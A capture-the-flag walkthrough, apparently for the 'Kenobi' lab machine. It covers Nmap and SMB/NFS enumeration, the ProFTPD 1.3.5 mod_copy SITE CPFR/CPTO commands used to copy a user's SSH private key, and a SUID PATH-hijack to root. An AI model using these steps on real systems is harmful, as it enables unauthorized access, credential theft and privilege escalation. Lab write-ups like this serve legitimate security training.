![](/img/01/01.gif)
- ## Machine IP : [10.10.141.110](10.10.141.110)
- ## Enumration step :

```
# Nmap 7.92 scan initiated Thu Nov  4 22:50:21 2021 as: nmap -sC -sV -A -O -oN kenobi-nmap.txt 10.10.141.110
Nmap scan report for 10.10.141.110
Host is up (0.37s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/4%OT=21%CT=1%CU=35918%PV=Y%DS=2%DC=T%G=Y%TM=618447C
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=103%GCD=1%ISR=106%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m14s, median: -2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-11-04T15:51:04-05:00
| smb2-time: 
|   date: 2021-11-04T20:51:04
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   335.67 ms 10.8.0.1
2   335.79 ms 10.10.141.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  4 22:51:21 2021 -- 1 IP address (1 host up) scanned in 60.07 seconds
```
- ## Fuzzing Directories Using GoBuster :
```
gobuster dir -u http://10.10.141.110/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.110/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/04 23:08:06 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 99727 / 220561 (45.22%) 
```

- ### As you can see nothing important came from this step so we will start looking at **SMB**

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.141.110

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 23:02 EET
Nmap scan report for 10.10.141.110
Host is up (0.58s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.141.110\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.141.110\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.141.110\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 76.62 seconds
```


### Let's try `smbclient` as anonymous and see what we get :

>smbclient //10.10.141.110/anonymous
>>
>>nter WORKGROUP\root's password: 
>>Try "help" to get a list of possible commands.
>>smb: \> ls
>>
>> .                                   D        0  Wed Sep  4 12:49:09 2019
>>
>>..                                  D        0  Wed Sep  4 12:56:07 2019
>>
>>log.txt                             N    12237  Wed Sep  4 12:49:09 2019
>>
>>9204224 blocks of size 1024. 6875988 blocks available  

>>smb: \> 
>>
>>>Then : smbget -R smb://10.10.141.110/anonymous/log.txt

>>>>Password for [root] connecting to //anonymous/10.10.141.110: 

>>>>Using workgroup WORKGROUP, user root

>>>>smb://10.10.141.110/anonymous/log.txt                                       

>>>>Downloaded 11.95kB in 8 seconds


--------------------------------------------------------------------------------


### **NOTE :**  The log.txt file Contains this information and it's usefull .


```

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi

```

- ## Now let's look at PORT 111 RPC ( Remote Procedure Call )

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.141.110

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 23:18 EET
Nmap scan report for 10.10.141.110
Host is up (0.25s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1845028.0  6868600.0  22%   16.0T        32000
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 4.04 seconds
```


## **Note :** we know that the private key of kenobi saved in ( /home/kenobi/.ssh/id_rsa ) So ...

- first we will search for version of the FTPD using netcat ( nc ) 
  - nc 10.10.141.110 21
    - 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [ 10.10.141.110 ]

- Then we Can use : searchsploit FTPD 1.3.5
  - ProFTPd 1.3.5 - 'mod_copy' Command Execut | linux/remote/37262.rb
  - ProFTPd 1.3.5 - 'mod_copy' Remote Command | linux/remote/36803.py
  - ProFTPd 1.3.5 - 'mod_copy' Remote Command | linux/remote/49908.py
  - ProFTPd 1.3.5 - File Copy                 | linux/remote/36742.txt
  
- ## **After Understaning All this notes we get that we can get the private key and use it**  

`searchsploit -x ProFTPd 1.3.5 - File Copy                 | linux/remote/36742.txt`

```

nc 10.10.141.110 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.141.110]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful


```

- # Now let's start our way in :

```

root@kali:~# mkdir /mnt/kenobiNFS
root@kali:~# mount 10.10.141.110:/var /mnt/kenobiNFS
root@kali:~# cd /mnt/kenobiNFS/

cp /mnt/kenobiNFS/tmp/id_rsa /root/thm/kenobi/id_rsa-kenobi
chmod 600 id_rsa-kenobi

```

![](/img/01/03.png)

- ## Getting the first flag :

![](/img/01/04.png)

- ## The Last Station is getting r00t :

```

kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

- ## What file looks particularly out of the ordinary? 
  - /usr/bin/menu

![](/img/01/05.png)

## The way into R00T :

```

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path.
This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh,
as well as this file being run as root it runs our shell as root!

```

![](/img/01/06.png)

## The R00T Flag :

![](/img/01/07.png)


- ## root@kali:/# init 0











